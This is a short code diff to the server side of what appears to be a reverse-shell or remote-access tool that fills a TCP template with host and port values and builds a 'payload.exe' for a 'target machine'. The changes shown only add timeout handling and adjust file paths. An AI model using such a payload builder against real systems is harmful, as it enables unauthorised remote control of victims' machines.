@@ -55,6 +55,9 @@ class Server:
                          exit()
                   except TimeoutError:
                       continue
+                  #Linux only
+                  except socket.timeout:
+                      continue
                   except ConnectionAbortedError:
                            print("[-]Connection aborted by target machine")
                            break
@@ -136,7 +139,7 @@ class Server:
 
 def main()->None:
    #Private variables that shoud not be changed
-    __TEMPLATE_PATH = "templates/spython_tcp_template.py"
+    __TEMPLATE_PATH = "../templates/spython_tcp_template.py"
     __PAYLOAD_FILE_NAME =  "payload.py"
     __SIG_HOST = "SPYTHON_HOST"
     __SIG_PORT = "SPYTHON_PORT"
@@ -190,8 +193,9 @@ def main()->None:
            if os.path.exists("payload.spec"):
               os.remove("payload.spec")
            print("[*]Payload generated !")
-           os.rename("./dist/payload.exe","./payload.exe")
+           os.rename("./dist/payload.exe","../executables/payload.exe")
            os.rmdir("./dist")
+           
                             
            break
         elif flag.lower() == "n":
